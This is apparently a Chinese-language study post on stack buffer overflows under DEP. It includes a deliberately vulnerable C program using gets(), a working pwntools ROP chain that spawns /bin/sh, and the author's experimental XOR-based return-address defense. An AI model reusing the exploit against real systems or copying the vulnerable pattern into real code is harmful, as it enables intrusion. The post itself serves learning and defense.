#Buffer Overflow With DEP

我設計了一個有buffer overflow漏洞的程式，開啟保護**DEP（NX）**的保護
為了方便實作DEP的bypass，ASLR調整為1，不開啟canary跟PIE的保護

code：

```
//ROP.c
#include <stdlib.h>
#include <stdio.h>

void bof(){
	int buf[50];
	gets(buf);
	return;
}

int main(){
	bof();
	return 0;
}
```

DEP不允許區段的寫入跟執行權限同時開啟
所以stack上佈好shellcode也無法執行
但有人想到一種bypass的方式

---

###ROP
想要我的財寶嗎？想要的話可以全部給你，去找吧！我把所有財寶都放在那裡XD

>找到程式中，可執行的片段（gadget），組合成shellcode
>gadgets的最後一個指令是ret的話
>就可以持續串聯下一個gadget

利用ROPgadget這套工具可以快速建好gadgets，只是要想辦法組好shellcode而已
攻擊程式：

```
#ROP.py
from pwn import *

r = remote('0.0.0.0', 4000)	#qira

binsh1 = 0x6e69622f	#'/bin'
binsh2 = 0x68732f	#'/sh'

padding = 'a' * 204 + p32(binsh1) + p32(binsh2)	#overflow & set /bin/sh at ebp-4 & ebp

#gadgets
pop_a = 0x080b8fa6	#pop eax ; ret
pop_dcb = 0x0806f9f0	#pop edx ; pop ecx ; pop ebx ; ret
syscal = 0x0806d5a5	#int 0x80

payload = padding + p32(pop_a) + p32(0xb) + p32(pop_dcb) + p32(0) + p32(0) + p32(0xf6fff354) + p32(syscal)

r.sendline(payload)

r.interactive()

r.close()
```

>某天我想到一個娛樂性有點高的防禦方法
>可以擋下ROP這類的攻擊，但是目前仍有一點缺陷...

===

#Defense ROP

其實，我一開始只是想讓他跳不到shellcode而已
為了完成這樣的目的，在程式流程剛進入callee時
我把gs段的0x14(就是32bits下的canary)跟ebp+4(return address)做XOR
然後放回去ebp+4
程式要返回caller之前，再取canary跟ebp+4做XOR，還原真正的return address
**如果ebp+4已經被竄改過**，他還是會和canary做XOR
這樣就跳不到attacker想要的位址了，感覺起來還不錯

code:（asm inline模擬版本）

```
//Defense.c
#include <stdlib.h>
#include <stdio.h>

void bof(){
	__asm__("mov %gs:0x14, %ecx\n\t"
		"xor 4(%ebp), %ecx\n\t"
		"mov %ecx, 4(%ebp)\n\t"
		"xor %ecx, %ecx");
	int buf[50];
	gets(buf);
	__asm__("mov %gs:0x14, %ecx\n\t"
		"xor 4(%ebp), %ecx\n\t"
                "mov %ecx, 4(%ebp)\n\t"
                "xor %ecx, %ecx");
	return;
}

int main(){
	bof();
	return 0;
}
```

缺陷是stack被洩漏的話，attacker可以先調整好第一個gadget

**娛樂性**在於：我真的不知道他會跳去哪裡
如果他XOR做完的return address是合法的，我完全無法預測會發生什麼事XD
目前當機次數：1

暫時先寫這樣，再慢慢擴充好了
